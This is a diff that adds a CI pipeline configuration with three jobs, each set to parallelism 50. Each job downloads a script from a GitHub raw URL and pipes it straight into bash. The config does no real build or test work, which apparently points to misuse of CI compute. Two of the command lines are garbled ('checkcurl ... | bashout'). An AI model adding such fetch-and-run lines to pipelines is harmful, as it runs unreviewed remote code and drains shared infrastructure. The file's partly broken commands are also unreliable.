@@ -1,0 +1,24 @@
+version: v1.0
+name: Parallel
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'checkcurl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bashout'
+            - ls
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'checkcurl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bashout'
+            - ls
+          parallelism: 50
+        - name: 'Job #3'
+          commands:
+            - 'curl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bash'
+          parallelism: 50
